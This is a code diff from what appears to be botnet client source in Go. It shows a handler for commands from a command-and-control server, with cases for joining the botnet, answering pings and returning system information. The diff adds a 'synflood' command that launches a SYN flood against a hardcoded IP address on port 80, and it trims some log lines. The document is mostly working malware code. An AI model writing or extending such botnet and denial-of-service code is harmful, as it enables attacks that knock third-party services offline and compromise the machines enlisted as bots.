@@ -74,10 +74,10 @@ func (b *Bot) HandleCommandFromCC(c *protocol.Command) error {
 		log.Printf("[cmd&ctrl] [[%s]] joined botnet at unix time: %d", c.Type, time.Now().Unix())
 		return nil
 	case protocol.CommandTypePing:
-		log.Printf("[cmd&ctrl] [[%s]] pinged by command and control at %d. full command: %v", c.Type, time.Now().Unix(), *c)
+		log.Printf("[cmd&ctrl] [[%s]] pinged by command and control at %d", c.Type, time.Now().Unix())
 		return b.SendMessageToCC(&protocol.Message{Type: protocol.MessageTypePong})
 	case protocol.CommandTypeSysInfo:
-		log.Printf("[cmd&ctrl] [[%s]] system info requested by command and control at %d. full command: %v", c.Type, time.Now().Unix(), *c)
+		log.Printf("[cmd&ctrl] [[%s]] system info requested by command and control at %d", c.Type, time.Now().Unix())
 		bytesJSON, err := exploits.GetSysInfo()
 		if err != nil {
 			return err
@@ -85,6 +85,9 @@ func (b *Bot) HandleCommandFromCC(c *protocol.Command) error {
 		return b.SendMessageToCC(&protocol.Message{Type: protocol.MessageTypeSysInfo, Args: protocol.MessageArgs{
 			protocol.SysInfoArgHoststat: string(bytesJSON),
 		}})
+	case protocol.CommandTypeSynflood:
+		log.Printf("[cmd&ctrl] [[%s]] synflood requested by command and control at %d", c.Type, time.Now().Unix())
+		return exploits.SYNFlood("151.101.194.133", 80, 20, 4, true)
 	default:
 		log.Printf("[cmd&ctrl] [[%s]] unhandled event type at %d. full command: %v", c.Type, time.Now().Unix(), *c)
 		return nil
